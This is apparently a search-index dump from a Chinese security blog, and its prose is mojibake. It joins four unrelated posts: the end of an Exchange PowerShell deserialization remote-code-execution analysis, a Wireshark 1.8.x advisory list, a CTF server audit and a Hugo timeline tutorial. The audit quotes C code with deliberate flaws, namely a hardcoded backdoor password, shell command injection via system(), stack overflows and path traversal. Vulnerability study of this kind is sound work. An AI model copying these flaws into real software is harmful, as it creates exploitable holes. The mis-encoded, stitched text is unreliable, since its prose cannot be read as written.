å‡½æ•°ï¼Œå…¶ä¸­PSMemberInfoIntegratingCollectionç±»ç»§æ‰¿äº†PSMemberInfoç±»ã€‚ä¼ å…¥æ„é€ å‡½æ•°çš„collectionså˜é‡æ¥æºäºPSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable) å‡½æ•°çš„è¿”å›å€¼ï¼Œæ„é€ å‡½æ•°å°†collectionsèµ‹ç»™å½“å‰å¯¹è±¡çš„collectionså±æ€§ã€‚\ninternal class PSMemberInfoIntegratingCollection\u0026lt;T\u0026gt; : PSMemberInfoCollection\u0026lt;T\u0026gt;, IEnumerable\u0026lt;T\u0026gt;, IEnumerable where T : PSMemberInfo { // Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4 private void GenerateAllReservedMembers() { if (!this.mshOwner.hasGeneratedReservedMembers) { this.mshOwner.hasGeneratedReservedMembers = true; ReservedNameMembers.GeneratePSExtendedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSBaseMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSObjectMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSAdaptedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSTypeNames(this.mshOwner); } } internal PSMemberInfoIntegratingCollection(object owner, Collection\u0026lt;CollectionEntry\u0026lt;T\u0026gt;\u0026gt; collections) { if (owner == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;owner\u0026#34;); } this.mshOwner = (owner as PSObject); this.memberSetOwner = (owner as PSMemberSet); if (this.mshOwner == null \u0026amp;\u0026amp; this.memberSetOwner == null) { throw PSTraceSource.NewArgumentException(\u0026#34;owner\u0026#34;); } if (collections == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;collections\u0026#34;); } this.collections = collections; } GetMemberCollectionä»£ç å¦‚ä¸‹ï¼Œå…¶ä¼šå°†å¯¹è±¡çš„adaptedMemberså±æ€§æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œè€Œåœ¨å†…å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶å·²ç»å°†åä¸ºTargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡åŠ å…¥åˆ°adaptedMemberså±æ€§ä¸­ã€‚æ‰€ä»¥è¿”å›çš„åˆ—è¡¨å†…ä¹Ÿä¼šåŒ…å«è¯¥å¯¹è±¡ã€‚\ninternal static Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable) { Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; collection = new Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt;(); if ((viewType \u0026amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended) { if (backupTypeTable == null) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), true, true, \u0026#34;type table members\u0026#34;)); } else { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;((PSObject msjObj) =\u0026gt; PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable), (PSObject msjObj, string name) =\u0026gt; PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable, name), true, true, \u0026#34;type table members\u0026#34;)); } } if ((viewType \u0026amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted) { **collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;adapted members\u0026#34;));** } if ((viewType \u0026amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;clr members\u0026#34;)); } return collection; } private static T AdapterGetMemberDelegate\u0026lt;T\u0026gt;(PSObject msjObj, string name) where T : PSMemberInfo { if (!msjObj.isDeserialized) { T t = msjObj.InternalAdapter.BaseGetMember\u0026lt;T\u0026gt;(msjObj.immediateBaseObject, name); PSObject.memberResolution.WriteLine(\u0026#34;Adapted member: {0}.\u0026#34;, (t == null) ? \u0026#34;not found\u0026#34; : t.Name); return t; } if (msjObj.adaptedMembers == null) { return default(T); } T t2 = msjObj.adaptedMembers[name] as T; PSObject.memberResolution.WriteLine(\u0026#34;Serialized adapted member: {0}.\u0026#34;, (t2 == null) ? \u0026#34;not found\u0026#34; : t2.Name); return t2; } è¿”å›åˆ°GetPSStandardMemberå‡½æ•°ä¸­ï¼ŒExchangeä¼šåŒ¹é…æ„é€ å‡½æ•°è¿”å›çš„å¯¹è±¡çš„memberNameå±æ€§ï¼Œè¯¥å±æ€§æ¥æºäºGetTargetTypeForDeserializationè°ƒç”¨æ—¶ä¼ é€’çš„ç¡¬ç¼–ç TargetTypeForDeserializationï¼Œå³å°†ä»è¯¥å¯¹è±¡ä¸­æ£€ç´¢åä¸ºTargetTypeForDeserializationçš„å€¼ï¼Œå‰é¢æåˆ°è¿‡åˆ—è¡¨å†…å·²æœ‰è¯¥åå­—çš„å¯¹è±¡ï¼Œæ‰€ä»¥å°†åŒ¹é…åˆ°XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼Œå¹¶è¿”å›ç»™ä¸Šå±‚å‡½æ•°ã€‚\nè¿”å›åˆ°ä¸Šå±‚å‡½æ•°ï¼ŒGetTargetTypeForDeserializationè¿”å›äº†XamlReaderç±»å‹ã€‚\nè¿›å…¥åˆ°ConvertToå‡½æ•°å†…ï¼ŒvalueToConvertä¸ºä¸Šå±‚å‡½æ•°ReadOneObjectå‡½æ•°ä¼ å…¥çš„objå¯¹è±¡ï¼Œå…¶å†…åŒ…å«äº†xamlååºåˆ—åŒ–çš„å‘½ä»¤æ‰§è¡Œå­—ç¬¦ä¸²ã€‚\nè¿›å…¥åˆ°LanguagePrimitives.FigureConversionåœ¨#3527å¤„æ–­ç‚¹ï¼Œæ­¤æ—¶fromTypeä¸ºStringï¼ŒtoTypeä¸ºXamlReader\nè¿›å…¥FigureParseConversionå†…ï¼Œå°†ä¼šé€šè¿‡åå°„è·å–åˆ°XamlReaderçš„Parseæ–¹æ³•ã€‚\nprivate static LanguagePrimitives.PSConverter\u0026lt;object\u0026gt; FigureParseConversion(Type fromType, Type toType) { ..... else if (fromType == typeof(string)) { MethodInfo methodInfo = null; try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string), typeof(IFormatProvider) }, null); } catch (AmbiguousMatchException ex) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex.Message); } catch (ArgumentException ex2) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex2.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithCulture); } try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string) }, null); } catch (AmbiguousMatchException ex3) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex3.Message); } catch (ArgumentException ex4) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex4.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithoutCulture); } } return null; } XamlReader.Parseæ–¹æ³•å°†ä¼šç”±LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCultureæ–¹æ³•è°ƒç”¨ã€‚ä¹‹åå°±æ˜¯æ™®é€šçš„ååºåˆ—åŒ–è¿‡ç¨‹äº†ã€‚\nå°ç»“ è¿™ä¸ªæ¼æ´åˆ©ç”¨é“¾æ ¸å¿ƒæ˜¯å¦‚ä½•ç»•è¿‡Exchangeé»‘åå•ç±»å¹¶ä½¿Exchangeå°†æ”»å‡»è€…æ§åˆ¶çš„æŒ‡å®šæ•°æ®ååºåˆ—åŒ–åˆ°æŒ‡å®šå±é™©ç±»é€ æˆä»£ç æ‰§è¡Œã€‚\næ¼æ´åˆ©ç”¨äº†Exchangeçš„åˆæ³•åŠŸèƒ½ï¼Œå…ˆæ„é€ äº†åä¸ºtargetTypeForDeserialization çš„XamlReaderç±»å‹çš„Typeå¯¹è±¡åºåˆ—åŒ–å€¼ï¼Œåˆ©ç”¨Microsoft.Exchange.Data.SerializationTypeConverterçš„ç‰¹æ€§è¿”å›äº†XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼Œè€ŒåReadPropertieså°†å…¶åŠ å…¥åˆ°adaptedMemberå†…ã€‚åœ¨å¤–å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œæ„é€ çš„PSMembersåŒ…å«äº†åä¸ºtargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼ŒExchangeä¼šåœ¨PSMembersåˆ—è¡¨å†…åŒ¹é…targetTypeForDeserializationé¡¹ï¼Œä»è€Œæ§åˆ¶äº†ConvertToå‡½æ•°è½¬åŒ–çš„ç›®æ ‡ç±»XamlReaderï¼ŒExchangeé€šè¿‡åå°„è·å–åˆ°äº†XamlReaderçš„Parseæ–¹æ³•ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ååºåˆ—åŒ–æ”»å‡»è€…å¯æ§çš„åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚\nåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­éœ€è¦å°†.NET Frameworkçš„ä¼˜åŒ–å…³æ‰ä»¥ä¾¿dnSpyè°ƒè¯•\n[.NET Framework Debugging Control] GenerateTrackingInfo=1 AllowOptimize=0 COMPlus_ZapDisable=1 COMPlus_ReadyToRun=0 å…¶ä»–\nPSRPï¼šPowerShell Remote Protocol powerShellè¿œç¨‹åè®®ï¼Œæ˜¯å¾®è½¯æä¾›çš„é€šè¿‡SOAPåè®®ä¸Šæ‰§è¡ŒPowerShellä»£ç çš„åè®®\nå‚è€ƒèµ„æ–™\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\nhttps://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\nCreated at 2023-05-05T20:35:49+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5ä»£ç å®¡è®¡","tags":[],"description":"","content":"é€šè¿‡çˆ¬å–wiresharkçš„æ¼æ´å…¬å‘Šé¡µé¢ï¼Œç­›é€‰1.8.6ä¿®å¤çš„æ¼æ´å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š\n1.8.6/1.8.7ä¿®å¤çš„æ¼æ´\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Serverå®¡è®¡","tags":[],"description":"","content":"ä»£ç åœ°å€\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\nç¼–è¯‘ï¼šgcc -m32 -g -o news_server news_server.c\nç›®æ ‡ï¼šæ‰¾å‡º10ä¸ªbugå’Œæ¼æ´\nnews_serveré»˜è®¤å·¥ä½œåœ¨æ ¹ç›®å½•ï¼Œæ²¡æœ‰é€šè¿‡chdiråˆ‡æ¢å·¥ä½œç›®å½•ï¼ˆä¸çŸ¥é“ç®—ä¸ç®—bugï¼‰\nä¿®å¤ï¼š\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); åœ¨authenticateå‡½æ•°å­˜åœ¨adminåé—¨\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate ä¸­ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ°å‘½ä»¤ï¼Œå‘½ä»¤æ³¨å…¥\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); æ ˆæº¢å‡ºã€ä»»æ„æ–‡ä»¶è¯»ï¼ˆç›®å½•ç©¿è¶Šï¼‰\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) æ–‡ä»¶å†™ï¼ˆç›®å½•ç©¿è¶Šï¼‰ã€æ ˆæº¢å‡º11å­—èŠ‚\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"ç»™hugo-theme-learnå¢åŠ timelineåŠŸèƒ½","tags":[],"description":"","content":"å‰è¨€ ç°åœ¨ä½¿ç”¨hugo-theme-learnä¸»é¢˜ï¼Œä½†è¿™ä¸ªä¸»é¢˜æ²¡æœ‰æä¾›æ—¶é—´çº¿åŠŸèƒ½ï¼Œä¸ºäº†ç»™é¦–é¡µå¢åŠ æ—¶é—´çº¿åŠŸèƒ½ï¼ŒèŠ±äº†ä¸¤å¤©ç ”ç©¶äº†ä¸€ä¸‹æ€ä¹ˆæ·»åŠ æ—¶é—´çº¿åŠŸèƒ½ã€‚\nä¸ºäº†æ–¹ä¾¿å¢åŠ æ—¶é—´çº¿çš„äº‹ä»¶ï¼Œé‡‡ç”¨è‡ªå®šä¹‰shortcodeçš„æ–¹å¼å¢åŠ æ—¶é—´çº¿ï¼Œä»£ç å¤§éƒ¨åˆ†å‚è€ƒå¼•ç”¨é“¾æ¥é‡Œé¢çš„ï¼Œé­”æ”¹äº†ä¸€ä¸‹ä»¥é€‚åº”è‡ªå·±çš„ä¸»é¢˜ï¼Œå¢åŠ äº†è¿‡å»å¤šå°‘å¤©çš„æ˜¾ç¤ºã€‚\nä»£ç å®ç° åœ¨layout/shortcodesæ–°å¢æ–‡ä»¶ï¼ševent.htmlå’Œtimeline.htmlï¼Œå†…å®¹åˆ†åˆ«å¦‚ä¸‹\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // å¦‚æœæœˆä»½å¤§äº1åˆ™ if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; ç”±äºevent.htmlé‡Œé¢å¼•ç”¨äº†dayjsï¼Œè¿™ä¸ªjsä¸åœ¨å½“å‰ä¸»é¢˜å†…ï¼Œå¯ä»¥åœ¨config.tomlæ–°å¢custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]ï¼Œç„¶åæŠŠdayjs.min.jsæ”¾åœ¨theme\\hugo-theme-learn\\static\\jsç›®å½•å†…ï¼Œå³å¯è§£å†³å¯¼å…¥dayjsçš„é—®é¢˜ã€‚\næ­¤æ—¶å¯ä»¥åœ¨éœ€è¦æ·»åŠ æ—¶é—´çº¿çš„åœ°æ–¹ä½¿ç”¨timelineçš„shortcodeæ·»åŠ 